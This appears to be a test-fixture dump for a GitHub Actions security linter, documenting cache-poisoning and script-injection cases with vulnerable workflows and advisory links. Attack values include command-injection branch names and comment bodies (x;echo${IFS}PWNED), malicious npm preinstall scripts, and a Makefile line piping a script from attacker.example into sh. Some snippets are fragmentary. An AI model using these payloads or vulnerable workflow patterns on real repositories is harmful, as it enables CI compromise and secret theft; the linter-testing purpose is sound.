true_negatives.text:
# situation: labeler.yml runs actions/labeler on pull_request_target with a
#   personal access token in the job label, which needs the job build and
#   has the if contains(needs.*.result, 'failure'); the configuration
#   .github/labeler.yml adds the label safe-to-test to a pull request that
#   changes a file under site/; labeled.yml runs on pull_request_target on
#   labeled when the label is safe-to-test, and the job has cache-mode
#   write, checks out the head of the pull request and runs npm ci.
# reason: GitHub evaluates the if of the job label, which calls no status
#   function, only when the job build succeeded, where needs.build.result is
#   success, so contains(needs.*.result, 'failure') is false; when the job
#   build fails or is skipped, GitHub skips the job label; so
#   actions/labeler adds no label
#   (https://github.com/github/docs/blob/404a5f4de6cd5311e3ce2d5c076571291e0107d6/content/actions/reference/workflows-and-actions/expressions.md,
#   status check functions).
# attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"mkdir -p ~/.npm && echo PWNED > ~/.npm/PWNED\"}}"
# attack-run-behavior: the attacker opens a pull request from a fork that
#   changes a file under site/; GitHub runs the job build, and the if of the
#   job label is false, so actions/labeler adds no label, and labeled.yml
#   does not start.
on:
  pull_request_target:
    types: [labeled]
jobs:
  build:
    if: github.event.label.name == 'safe-to-test'
    runs-on: ubuntu-latest
    cache-mode: write
    steps:
      - uses: actions/checkout@v4.2.2
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci

true_negatives.text:
# situation: the bundle-size workflow of the TanStack incident (2026-05-11)
#   as it was: pull_request_target checks out the merge of the pull
#   request, a composite action sets up pnpm with actions/cache, a build
#   runs the pull request's code, and no cache-mode is written.
# reason: since 2026-06-26 GitHub gives a run of pull_request_target read
#   access only to the cache of the default branch's scope unless a
#   cache-mode asks for write: the store the code changes is not saved.
#   The build still runs the pull request's code with the job's token,
#   which untrusted-checkout reports.
# attack-value: the file packages/history/vite_setup.mjs in the pull request = "console.log('PWNED')"
# attack-run-behavior: the build runs the pull request's code; at the end of
#   the job the post step of actions/cache logs that saving is denied, and
#   the release workflow restores no entry of the attacker's.

  pull_request_target:
    paths: ['packages/**']
permissions:
  contents: read

    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6.0.2
        with:
          ref: refs/pull/${{ github.event.pull_request.number }}/merge
      - uses: TanStack/config/.github/setup@main
      - run: pnpm nx run @benchmarks/bundle-size:build

      - any-glob-to-any-file: 'site/**'

others.name: .github/workflows/labeler.yml

notes.situation: labeler.yml runs actions/labeler on workflow_run with a personal access token, on the pull request whose number a step finds; the configuration .github/labeler.yml adds the label safe-to-test to a pull request that changes a file under site/; labeled.yml runs on pull_request_target on labeled when the label is safe-to-test, and the job has cache-mode write, checks out the head of the pull request and runs npm ci.
notes.reason: the pull request of the attacker starts the run of build, whose workflow_run runs actions/labeler on the pull request of the attacker, and a label that the token adds starts the labeled run, so no person approves the run before the label starts the run.
notes.cause: the rule reads actions/labeler on the events of a pull request only, and does not read the step that finds the number of the pull request for pr-number.

attack_value.carrier: the file package.json in the pull request's head

notes.attack_run_behavior: the attacker opens a pull request from a fork that changes a file under site/; when labeler.yml runs on schedule, actions/labeler adds the label safe-to-test, which starts labeled.yml, and npm ci runs the preinstall script of the pull request in a job that may save to the cache of the scope of the default branch, so the code of the attacker can save an entry there.

undetected_forms.text: an execution of the linter on a list of files, not on the whole repository: the rule does not read the workflows that are not in the list, and so does not read a step of actions/labeler in a workflow that is not in the list

examples.name: labeler-not-input.yml
examples.text:
# situation: the linter is given labeled.yml alone; the repository also has a
#   workflow that runs actions/labeler on pull_request_target with a personal
#   access token and adds the label safe-to-test to a pull request that
#   changes a file under site/; labeled.yml runs on pull_request_target on
#   labeled when the label is safe-to-test, and the job has cache-mode write,
#   checks out the head of the pull request and runs npm ci.
# reason: the workflow that runs actions/labeler adds the label to the pull
#   request of the attacker, so no person approves the run before the label
#   starts the run.
# cause: the run of the linter reads only the files that it names, so the rule
#   does not read the workflow that runs actions/labeler.
# attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"mkdir -p ~/.npm && echo PWNED > ~/.npm/PWNED\"}}"
# attack-run-behavior: the attacker opens a pull request from a fork that
#   changes a file under site/ and the files of the attack; actions/labeler
#   adds the label safe-to-test, which starts labeled.yml, and npm ci runs the
#   preinstall script of the pull request in a job that may save to the cache
#   of the scope of the default branch, so the code of the attacker can save
#   an entry there.
on:
  pull_request_target:
    types: [labeled]
jobs:
  build:
    if: github.event.label.name == 'safe-to-test'
    runs-on: ubuntu-latest
    cache-mode: write
    steps:
      - uses: actions/checkout@v4.2.2
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci

notes.situation: the linter is given labeled.yml alone; the repository also has a workflow that runs actions/labeler on pull_request_target with a personal access token and adds the label safe-to-test to a pull request that changes a file under site/; labeled.yml runs on pull_request_target on labeled when the label is safe-to-test, and the job has cache-mode write, checks out the head of the pull request and runs npm ci.
notes.reason: the workflow that runs actions/labeler adds the label to the pull request of the attacker, so no person approves the run before the label starts the run.
notes.cause: the run of the linter reads only the files that it names, so the rule does not read the workflow that runs actions/labeler.

attack_value.carrier: the file package.json in the pull request's head

notes.attack_run_behavior: the attacker opens a pull request from a fork that changes a file under site/ and the files of the attack; actions/labeler adds the label safe-to-test, which starts labeled.yml, and npm ci runs the preinstall script of the pull request in a job that may save to the cache of the scope of the default branch, so the code of the attacker can save an entry there.

undetected_forms.text: a job or a step inside a reusable workflow of another repository (uses: owner/repo/.github/workflows/<file>@<ref>) whose content the fact workflow.definition does not give. For every rule: a run that does not ask the fact (a run without --online and without the answer in --facts). For a quality rule, also: a run where the linter asked the fact and got no answer (an answer of unknown: the GitHub API did not give the file), and a call deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact. The rule reads a reusable workflow of another repository only from the answer of workflow.definition. For a rule that is not a quality rule (a rule with a threat), the last two forms are the inconclusive kind remote-callee-unknown, not this form

examples.name: remote-callee.yml
examples.text:
# situation: a job calls the reusable workflow .github/workflows/w.yml of
#   the repository example-org/cache-poisoning-unanswered, whose content is
#   the workflow of the true positive writable-job
#   (writable-job.tanstack.yml) of the rule, with on: workflow_call in place
#   of the on of writable-job.tanstack.yml. The linter has no answer of the
#   fact workflow.definition for the reusable workflow.
# reason: a todo (a fact): the jobs of a reusable workflow run on the event
#   that started the run of the calling job, and the linter does not read
#   the reusable workflow.
# cause: the rule reads a reusable workflow of another repository only from
#   the answer of workflow.definition.
# attack-value: the file packages/history/vite_setup.mjs in the pull request = "console.log('PWNED')"
# attack-run-behavior: the checkout fetches refs/pull/<n>/merge, the build
#   runs the pull request's code, which writes into the pnpm store; at the
#   end of the job actions/cache saves the store to the default branch's
#   scope, and the release workflow restores it and runs it.
on:
  pull_request_target:
    paths: ['packages/**']
permissions: {}
jobs:
  c:
    uses: example-org/cache-poisoning-unanswered/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee

notes.situation: a job calls the reusable workflow .github/workflows/w.yml of the repository example-org/cache-poisoning-unanswered, whose content is the workflow of the true positive writable-job (writable-job.tanstack.yml) of the rule, with on: workflow_call in place of the on of writable-job.tanstack.yml. The linter has no answer of the fact workflow.definition for the reusable workflow.
notes.reason: a todo (a fact): the jobs of a reusable workflow run on the event that started the run of the calling job, and the linter does not read the reusable workflow.
notes.cause: the rule reads a reusable workflow of another repository only from the answer of workflow.definition.

attack_value.carrier: the file packages/history/vite_setup.mjs in the pull request

notes.attack_run_behavior: the checkout fetches refs/pull/<n>/merge, the build runs the pull request's code, which writes into the pnpm store; at the end of the job actions/cache saves the store to the default branch's scope, and the release workflow restores it and runs it.

undetected_forms.text: a job that runs only when a label is added to a pull request (pull_request_target with the activity type labeled), whose if needs both a label and the author_association MEMBER or COLLABORATOR of the author of the pull request, in a run of the linter that adds read-member and writer-pull-requests-token or app-installation-token, and does not add triage-account: one attacker who holds both credentials opens the pull request from the account with the read role and adds the label with the token, and the job runs for the pull request of the attacker in the same way that the job runs for a pull request after a person who can add labels adds the label to approve the pull request. The linter runs the rules once for each added attacker alone and reads each added attacker as a separate attacker, so no run lets one attacker past both the if of author_association and the approval by the label. A run that adds triage-account reports the job, as an account with the triage role both has the author_association MEMBER or COLLABORATOR and adds a label

examples.name: combined-credentials.yml
examples.text:
# situation: on pull_request_target with the activity type labeled, a job
#   whose if needs the label safe-to-test and the author_association MEMBER
#   of the author of the pull request writes cache-mode write, checks out
#   the head of the pull request with allow-unsafe-pr-checkout, and runs
#   make test.
# reason: a todo (more analysis by the linter): one attacker who holds
#   both an account with the read role and a token of a writer with the
#   Pull requests permission (the added attackers read-member and
#   writer-pull-requests-token) opens the pull request from the account,
#   whose author_association is MEMBER, and adds the label with the token,
#   and the job, which may save to the cache of the default branch, runs on
#   the pull request of the attacker.
# cause: the linter runs the rules once for each added attacker alone, and
#   reads each added attacker as a separate attacker: the run that adds
#   read-member does not let the attacker add a label, and the run that
#   adds writer-pull-requests-token reads the author of the pull request
#   as an outsider. A run that adds triage-account reports the job, as an
#   account with the triage role both has the author_association MEMBER
#   and adds a label.
# attack-value: the file Makefile in the head of the pull request = "test:\n\tcurl -fsS https://attacker.example/poison.sh | sh\n"
# attack-run-behavior: the member account opens a pull request from a fork,
#   the token adds the label safe-to-test, the if is true, the checkout
#   fetches head.sha, and make runs the target test of the pull request,
#   which saves an entry of the attacker to the cache of the default
#   branch.
on:
  pull_request_target:
    types: [labeled]
jobs:
  test:
    if: contains(github.event.pull_request.labels.*.name, 'safe-to-test') && github.event.pull_request.author_association == 'MEMBER'
    runs-on: ubuntu-latest
    cache-mode: write
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          allow-unsafe-pr-checkout: true
      - run: make test

notes.situation: on pull_request_target with the activity type labeled, a job whose if needs the label safe-to-test and the author_association MEMBER of the author of the pull request writes cache-mode write, checks out the head of the pull request with allow-unsafe-pr-checkout, and runs make test.
notes.reason: a todo (more analysis by the linter): one attacker who holds both an account with the read role and a token of a writer with the Pull requests permission (the added attackers read-member and writer-pull-requests-token) opens the pull request from the account, whose author_association is MEMBER, and adds the label with the token, and the job, which may save to the cache of the default branch, runs on the pull request of the attacker.
notes.cause: the linter runs the rules once for each added attacker alone, and reads each added attacker as a separate attacker: the run that adds read-member does not let the attacker add a label, and the run that adds writer-pull-requests-token reads the author of the pull request as an outsider. A run that adds triage-account reports the job, as an account with the triage role both has the author_association MEMBER and adds a label.

attack_value.carrier: the file Makefile in the head of the pull request

notes.attack_run_behavior: the member account opens a pull request from a fork, the token adds the label safe-to-test, the if is true, the checkout fetches head.sha, and make runs the target test of the pull request, which saves an entry of the attacker to the cache of the default branch.

inconclusive_kinds.text: the output of a step that runs a script (steps.<id>.outputs), which the script writes to $GITHUB_OUTPUT

examples.name: step-output-run.yml
examples.text:
# situation: on issues, a job with cache-mode: write saves build with
#   actions/cache/save under a key that has ${{ steps.s.outputs.o }}.
# reason: the output is what the script writes at run time, so whether an
#   attacker controls it is not known.
# attack-value: steps.s.outputs.o = "deps-Linux-5f4dcc3b5aa765d61d8327deb882cf99"
# attack-run-behavior: when ${{ steps.s.outputs.o }} holds the value, the job
#   saves build to the cache of the default branch's scope under build-<value>,
#   a key the attacker chose.
on: issues
cache-mode: write
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - id: s
        run: echo "o=x" >> "$GITHUB_OUTPUT"
      - uses: actions/cache/save@v4
        with:
          path: build
          key: build-${{ steps.s.outputs.o }}

notes.situation: on issues, a job with cache-mode: write saves build with actions/cache/save under a key that has ${{ steps.s.outputs.o }}.
notes.reason: the output is what the script writes at run time, so whether an attacker controls it is not known.
notes.attack_run_behavior: when ${{ steps.s.outputs.o }} holds the value, the job saves build to the cache of the default branch's scope under build-<value>, a key the attacker chose.

inconclusive_kinds.text: an input of workflow_dispatch (inputs, github.event.inputs): whoever dispatches the workflow chooses the value of the input. A credential whose only write access is to the permission Actions can dispatch the workflow, and the credential premise keeps the holder of such a credential as a possible attacker; the linter does not know whether such a credential exists or who holds it. The rule reports the value in a job with an environment that has required reviewers too, where a required reviewer of the environment can stop the run

examples.name: input-dispatch.yml
examples.text:
# situation: on workflow_dispatch, a job with no cache-mode saves build with
#   actions/cache/save under a key that has ${{ inputs.x }} and ${{
#   github.event.inputs.x }}.
# reason: whoever dispatches the workflow chooses the value, and the workflow
#   does not tell who that is, so whether an attacker controls it is not known;
#   nothing the rule could read is expected to tell it.
# attack-value: inputs.x = "deps-Linux-5f4dcc3b5aa765d61d8327deb882cf99"
# attack-run-behavior: a run of workflow_dispatch saves to the cache with no
#   cache-mode; when the one who dispatches the workflow chooses the default
#   branch as the ref and gives the value as x, which ${{ inputs.x }} and
#   ${{ github.event.inputs.x }} both hold, the job saves build to the cache
#   of the default branch's scope under build-<value> <value>, a key the one
#   who dispatches the workflow chose.
on:
  workflow_dispatch:
    inputs:
      x: {}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache/save@v4
        with:
          path: build
          key: build-${{ inputs.x }} ${{ github.event.inputs.x }}

notes.situation: on workflow_dispatch, a job with no cache-mode saves build with actions/cache/save under a key that has ${{ inputs.x }} and ${{ github.event.inputs.x }}.
notes.reason: whoever dispatches the workflow chooses the value, and the workflow does not tell who that is, so whether an attacker controls it is not known; nothing the rule could read is expected to tell it.
notes.attack_run_behavior: a run of workflow_dispatch saves to the cache with no cache-mode; when the one who dispatches the workflow chooses the default branch as the ref and gives the value as x, which ${{ inputs.x }} and ${{ github.event.inputs.x }} both hold, the job saves build to the cache of the default branch's scope under build-<value> <value>, a key the one who dispatches the workflow chose.

notes.reason: whoever dispatches the workflow chooses the ref, and the workflow does not tell who that is, so whether an attacker controls the code that pnpm build runs is not known; nothing the rule could read is expected to tell it.

false_positive_forms.text: a value that an if compares with strings that the workflow writes in the if (strings compared by == with the value and joined by ||, or the strings of contains(fromJSON('[...]'), value)), where each string has only ASCII letters, digits, spaces, -, _, . and /, does not start with -, and has no - right after a space, where the rule reports the value although the if limits the value to those strings, because the rule does not read the if in one of three forms. (1) A reusable workflow or a composite action gets the value through an input, and the if of the calling job or the calling step compares the value. The rule reports the value in the file of the reusable workflow or the composite action. The value is harmless when the if of every caller of that file, inside and outside the repository, compares the value. (2) The if compares the value under one name, and the script writes the value under another name: for example, the if compares env.BODY, which the env of the step sets to ${{ github.event.comment.body }}, and the script writes ${{ github.event.comment.body }}; or the if compares ${{ github.head_ref }}, and the script writes ${{ github.event.pull_request.head.ref }}. The value is harmless when the two names hold the same value in the step; the rule does not check that the two names hold the same value. (3) The if of a step that uses an action compares a value that the with or the env of the same step holds. At the start of the job, the runner runs the pre step of each action from another repository whose action.yml has runs.pre, under the condition runs.pre-if of that action.yml and not under the if of the step. For the pre step, the runner evaluates the with and the env of the step, and the code of the pre step may read the inputs. The runner runs no pre step of a local action (./). The value is harmless when the action has no pre step, or when the code of the pre step does not read the value. In each form, the value is harmless only where the case of the letters does not change what the value names (the undetected form if-compared)

examples.text:
# situation: on pull_request_target with the activity type labeled, a job
#   that runs only when the label safe-to-test is added checks out the head
#   of the pull request, runs npm ci, and has a token that writes and a
#   cache that the job may save to.
# reason: in a run of the linter that adds triage-account, the rule reads
#   the label safe-to-test as a label that the attacker can add; when the
#   repository has no label safe-to-test, the attacker cannot add the
#   label, because the triage role cannot create a label, and the job does
#   not run on the attacker's pull request.
# cause: the rule does not read the labels of the repository: it reads
#   every label that the if of the job compares with as a label that the
#   repository has.
# attack-value: the file package.json in the head of the pull request = "{\"scripts\": {\"preinstall\": \"echo PWNED\"}}"
# attack-run-behavior: the repository has no label safe-to-test, so the
#   attacker cannot add the label safe-to-test, no run of the job starts,
#   and npm never runs the preinstall script.
on:
  pull_request_target:
    types: [labeled]
jobs:
  build:
    if: github.event.label.name == 'safe-to-test'
    runs-on: ubuntu-latest
    cache-mode: write
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4.2.2
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci

preconditions.text: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The finding is conditional when no file of facts and no --fact answers the facts

#   words of an array, with no quotes; the lines that run the scanner (lines
#   56-57) are left out. The step trivy is the step that writes trivy_envs.txt
#   in action.yaml of aquasecurity/trivy-action (v0.33.1, commit
#   b6643a29fecd7f34b3597bc6acb0a98b03d33ff8, lines 181-190 and 201): the input
#   in double quotes, as an argument of a function that writes an export line;
#   the calls for the other inputs (lines 194-200 and 202-211) and the step that
#   sources trivy_envs.txt in entrypoint.sh are left out.
# reason: the author of a pull request writes its body, and the runner puts
#   the input into each script before bash reads the script, so a $( ) in the
#   body runs as a command in each way: inside double quotes and in a word with
#   no quotes. For trivy-action, the advisory names a second place: the export
#   line written without escaping, which entrypoint.sh sources; the rule reports
#   the first place, where the input is written into run.
# attack-value: inputs.pr_body = "$(echo PWNED > /proc/$$/fd/1)"
# attack-run-behavior: in the script of the step ydb, bash runs the command
#   substitution of the input while it reads the line; $$ inside the
#   substitution is the process ID of the shell of the script, so echo writes
#   PWNED to the standard output of the script, and the line PWNED appears in
#   the log of the step. The steps prek and trivy run the substitution the same
#   way inside double quotes, and the step sonar runs the substitution in a word
#   with no quotes.
# advisory: https://github.com/advisories/GHSA-9p44-j4g5-cfx5
# advisory: https://github.com/advisories/GHSA-pwf7-47c3-mfhx
# advisory: https://github.com/advisories/GHSA-f79p-9c5r-xg88
# advisory: https://securitylab.github.com/advisories/GHSL-2025-089_ydb-platform_ydb/
name: validate
description: four steps that write an input into run
inputs:
  pr_body:
    description: the body of the pull request
  prek-version:
    description: the version of prek
  args:
    description: the arguments of the scanner
  output:
    description: the file of the output of trivy
runs:
  using: composite
  steps:
    - name: Save PR body to temporary file
      shell: bash
      run: |
        echo "${{ inputs.pr_body }}" > pr_body.txt
    - name: Resolve download URL
      run: |
        if [ "${{ inputs.prek-version }}" = "latest" ]; then
          echo "version=latest" >> $GITHUB_OUTPUT
        fi
      shell: bash
    - name: Run SonarScanner
      run: |
        args=(${{ inputs.args }})
      shell: bash
    - name: Set Trivy environment variables
      shell: bash
      run: |
        set_env_var_if_provided() {
          local var_name="$1"
          local input_value="$2"
          local default_value="$3"

            echo "export $var_name=$input_value" >> trivy_envs.txt

true_positives.name: controlled.ghsl-2020-191.yml
true_positives.text:
# situation: on issue_comment, a step writes the body of the comment into its
#   script with echo; on gollum, a step writes the name of a wiki page,
#   through env, into a file whose content a later step passes to npm as one
#   argument. This is the whole of contrib-notice.yml of
#   KanCraft/kanColleWidget (commit d2065402071547f935a2c79014bc0fc8e4ccfb61).
# reason: the runner puts the body of the comment into the script before bash
#   reads the script, so the author of the comment writes code that the step
#   runs, with the secrets of the job in its environment. argument-injection,
#   unsecure-commands and set-output-injection report nothing on the step of
#   gollum: the name of the page is not at the head of a word of a command,
#   and the step does not print the name to the log.
# attack-value: github.event.comment.body = "x\"; echo PWNED; echo \""
# attack-run-behavior: the line becomes echo "[DEBUG] ORIG: x"; echo PWNED;
#   echo "", and bash prints PWNED.
# advisory: https://securitylab.github.com/advisories/GHSL-2020-191-KanCraft-kanColleWidget-workflow/
name: Contribution Notice

on:
  issues:
    types: [opened, reopened]
  issue_comment:
    types: [created]
  gollum:
  # pull_request:
  # PullRequestの通知は、IFTTTにしました。
  # ソースブランチがこのRepoの外だと、このWorkflowの中でSecretsのTWITTER_*が利用できないので。

jobs:
  notification:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
    - uses: actions/setup-node@v1
      with:
        node-version: 12.x
    - run: npm install

    - name: Issue用ツイート内容の生成
      if: github.event_name == 'issues' && github.event.action == 'opened'
      env:
        SENDER: ${{ github.event.sender.login}}
        TITLE: ${{ github.event.issue.title}}
        URL: ${{ github.event.issue.html_url }}
      run: |
        echo -ne "ご意見が届きました！\n\n> ${TITLE}\n${SENDER}さん より\n\n#艦これウィジェット\n${URL}" >> announcement.txt

    - name: Issueコメント用ツイート内容の生成
      if: github.event_name == 'issue_comment' && github.event.action == 'created' && github.event.sender.login != 'coveralls'
      env:
        SENDER: ${{ github.event.sender.login }}
        BODY: ${{ github.event.comment.body }}
        URL: ${{ github.event.comment.html_url }}
      run: |
        echo "[DEBUG] ORIG: ${{ github.event.comment.body }}"
        echo "[DEBUG] BODY: ${BODY}"
        if [ ${#BODY} -gt 80 ]; then TEXT="$(echo ${BODY} | cut -c1-80)…"; else TEXT=${BODY}; fi;
        echo "[DEBUG] TEXT: ${TEXT}"
        echo -ne "${SENDER}さんがコメントしました！\n> ${TEXT}\n${URL}" >> announcement.txt

    - name: Wiki用ツイート内容の生成
      if: github.event_name == 'gollum'
      env:

# situation: on workflow_run of runs on master, release/* and next/*, a step
#   of actions/github-script writes the head branch of the triggering run
#   into a JavaScript string of its script by ${{ }}. This is the step Generate
#   Slack Payload of release-and-tests-fail-bot.yml of Kong/kong (commit
#   99cb0608050cbd14611e7795960aade9fc6360cc, lines 1-17, 47-59 and 66); the
#   condition of the job, the steps before it, the env of the step, the other
#   constants and the step that posts the payload are left out.
#   notify-tsc-members-mention.yml of asyncapi/.github (commit
#   703ea72bb92c214b226ecb1484df21a23f835c8d, GHSL-2024-052) writes the titles
#   of issues, pull requests and discussions into JavaScript strings of
#   actions/github-script the same way (lines 72, 117, 162, 207, 252 and 297).
# reason: on workflow_run, the author of a pull request from a fork names the
#   head branch of the triggering run, which
#   github.event.workflow_run.head_branch gives (a branch named release/… of
#   the fork passes the filter of branches), and the runner puts the name into
#   the script before node.js reads the script, so a " in the name ends the
#   string and the rest runs as JavaScript.
# attack-value: github.event.workflow_run.head_branch = "release/x\";console.log('PWNED');\""
# attack-run-behavior: the script becomes const branch_name = "release/x";
#   console.log('PWNED');""; and node.js runs console.log, which prints PWNED,
#   with secrets.PAT and the Slack webhook of the job within reach.
# advisory: https://securitylab.github.com/advisories/GHSL-2024-126_Kong/
# advisory: https://securitylab.github.com/advisories/GHSL-2024-052_AsyncAPI/
on:
  workflow_run:
    workflows: ["Package & Release", "Build & Test"]
    types:
      - completed
    branches:
      - master
      - release/*
      - next/*
jobs:
  notify_failure:
    runs-on: ubuntu-latest
    steps:
      - name: Generate Slack Payload
        id: generate-payload
        uses: actions/github-script@v7
        with:
          script: |
            const branch_name = "${{ github.event.workflow_run.head_branch }}";
            return { text: `branch: "${branch_name}"` };

notes.reason: anyone who may comment on an issue writes its body, and the runner puts the body into the script before bash reads the script.
notes.attack_run_behavior: the attacker comments x; echo PWNED on any issue; the script becomes echo x; echo PWNED, and bash runs the second echo as a command, which prints PWNED, with the token of the job, which the advisory says writes.

# situation: on workflow_run, after the artifact of the triggering run is
#   unzipped, a step reads pr/pr_base of the artifact into a variable of the
#   script and writes PR_BASE=<value> to $GITHUB_ENV, and a later step writes
#   env.PR_BASE and github.event.workflow_run.head_branch into its run by
#   ${{ }}. This is pr-sonar.yml of adobe/react-spectrum-charts (commit
#   886e2d55d381ff4233a83b4a46f602bac73f2e0f, lines 1-9 and 42-68); the
#   checkout of the code of the pull request, the download with
#   actions/github-script, the lines for PR_NUMBER and PR_BRANCH, the echo
#   lines and the steps after line 68 are left out.
# reason: on workflow_run, the author of a pull request from a fork names the
#   head branch of the triggering run, which github.event.workflow_run.head_branch
#   gives, and the runner puts the name into the script before bash reads the
#   script (GHSL-2024-267). The rule reports the head branch; it does not
#   follow pr_base through the variable of the script into $GITHUB_ENV and
#   env.PR_BASE (GHSL-2024-266 and the rest of GHSL-2024-267; the
#   envvar-injection undetected form script-var).
# attack-value: github.event.workflow_run.head_branch = "x;echo${IFS}PWNED;#"
# attack-run-behavior: the author of a pull request from a fork names its head
#   branch x;echo${IFS}PWNED;# (a name of a branch has no space, and ${IFS}
#   stands for one). The step Checkout base branch runs git checkout x, then
#   echo PWNED, which prints PWNED, with the token of the job.
# advisory: https://securitylab.github.com/advisories/GHSL-2024-266_GHSL-2024-267_Adobe_React_Spectrum_Charts/
on:
  workflow_run:
    workflows: [PR Build]
    types: [completed]
jobs:
  sonar:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - name: Unzip artifacts 📁
        run: unzip rsc-pr-build-artifacts.zip
      - name: Setup workflow variables 📝
        run: |
          pr_base="$(<pr/pr_base)"
          echo "PR_BASE=${pr_base}" >> $GITHUB_ENV
      - name: Checkout base branch 🌳
        run: |
          git remote add upstream ${{ github.event.repository.clone_url }}
          git fetch upstream
          git checkout -B ${{ env.PR_BASE }} upstream/${{ env.PR_BASE }}
          git checkout ${{ github.event.workflow_run.head_branch }}
          git clean -ffdx && git reset --hard HEAD

notes.situation: on workflow_run, after the artifact of the triggering run is unzipped, a step reads pr/pr_base of the artifact into a variable of the script and writes PR_BASE=<value> to $GITHUB_ENV, and a later step writes env.PR_BASE and github.event.workflow_run.head_branch into its run by ${{ }}. This is pr-sonar.yml of adobe/react-spectrum-charts (commit 886e2d55d381ff4233a83b4a46f602bac73f2e0f, lines 1-9 and 42-68); the checkout of the code of the pull request, the download with actions/github-script, the lines for PR_NUMBER and PR_BRANCH, the echo lines and the steps after line 68 are left out.
notes.reason: on workflow_run, the author of a pull request from a fork names the head branch of the triggering run, which github.event.workflow_run.head_branch gives, and the runner puts the name into the script before bash reads the script (GHSL-2024-267). The rule reports the head branch; it does not follow pr_base through the variable of the script into $GITHUB_ENV and env.PR_BASE (GHSL-2024-266 and the rest of GHSL-2024-267; the envvar-injection undetected form script-var).

true_positives.text:
# situation: on pull_request_target, a step sets the env ref from the name of
#   the head branch of the pull request and puts ${{ env.ref }} into the
#   argument of git push in its script. The workflow is also a reusable
#   workflow (workflow_call). This is build-images-base.yaml of cilium/cilium
#   (commit 475310f713fb25897b1b939668c73db7da359d08, lines 310-315).
# reason: the runner puts the name of the branch into the script before bash
#   reads the script, so the author of the pull request writes code that the
#   step runs.
# attack-value: github.event.pull_request.head.ref = "x;echo${IFS}PWNED"
# attack-run-behavior: the line becomes git push https://x@github.com/x.git
#   HEAD:x;echo${IFS}PWNED, and bash prints PWNED after git push.
# advisory: https://securitylab.github.com/advisories/GHSL-2024-274_GHSL-2024-275_Cilium/
on:
  pull_request_target:
    types: [opened, synchronize, reopened]
  workflow_call: {}
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - name: Push changes into PR
        env:
          ref: ${{ github.event.pull_request.head.ref || github.ref }}
        run: git push https://x@github.com/x.git HEAD:${{ env.ref }}

notes.situation: on pull_request_target, a step sets the env ref from the name of the head branch of the pull request and puts ${{ env.ref }} into the argument of git push in its script. The workflow is also a reusable workflow (workflow_call). This is build-images-base.yaml of cilium/cilium (commit 475310f713fb25897b1b939668c73db7da359d08, lines 310-315).

true_positives.text:
# situation: on workflow_run, a step writes the head branch of the triggering
#   run into its run by ${{ }}, inside a JSON object in single quotes, with
#   the AWS secret of the repository in its env. This is the step Upload test
#   results to S3 of upload-test-results.yml of trinodb/trino (commit
#   f6e0a94c7cc311aa64dbe61ed5fc278150185954, lines 1-5 and the step; line 95
#   is the jq command); the other jobs and steps, the if of the step, the
#   selectors of yq, the find commands, the loop and the upload to S3 are left
#   out, and the JSON object keeps only the branch and the head sha.
# reason: on workflow_run, the author of a pull request from a fork names the
#   head branch of the triggering run, which
#   github.event.workflow_run.head_branch gives, and the runner puts the name
#   into the script before bash reads the script, so a ' in the name ends the
#   quoting and the rest runs as commands. The advisory names a branch with
#   backquotes, which bash does not run inside the single quotes.
# attack-value: github.event.workflow_run.head_branch = "x\"}'${IFS}-n;echo${IFS}PWNED;'"
# attack-run-behavior: the author of a pull request from a fork names its head
#   branch x"}'${IFS}-n;echo${IFS}PWNED;' (a name of a branch has no space,
#   and ${IFS} stands for one). The name closes the JSON object and the
#   quoting, so jq gets the valid object and -n, prints null and exits 0
#   under -euo pipefail, and bash runs echo PWNED, which prints PWNED, with
#   TEST_RESULTS_AWS_SECRET_ACCESS_KEY in the env of the step.
# advisory: https://securitylab.github.com/advisories/GHSL-2024-319_Trino_DB/
on:
  workflow_run:
    workflows: ["ci", "docs"]
    types:

jobs:

            '. + $addObj' results.ndjson > out.json

true_positives.text:
# situation: a composite action that downloads and installs lychee and runs
#   it; its step Download and extract lychee writes inputs.lycheeVersion
#   into run by ${{ }}, and the caller links.yml, on issues, gives the title
#   of an issue as lycheeVersion.
# reason: anyone who opens an issue writes its title, and ${{ }} puts it
#   into the script of that step before bash parses it, so a single quote in
#   it ends the quoted string of the [[ ]] test and what follows runs as
#   commands. This is the action.yml of lycheeverse/lychee-action at
#   8ad54d3568ac3176a9fb57a0233cf04410b55cde, the parent of the fix
#   7cd0af4c74a61395d455af97419279d86aafaede, as it was (lychee-action
#   before 2.0.2). The advisory
#   (https://github.com/advisories/GHSA-65rg-554r-9j5x, CVE-2024-48908):
#   "The GitHub Action variable `inputs.lycheeVersion` can be used to
#   execute arbitrary code in the context of the action." The advisory's
#   proof of concept gives the value in with; here the issue's title gives
#   it.
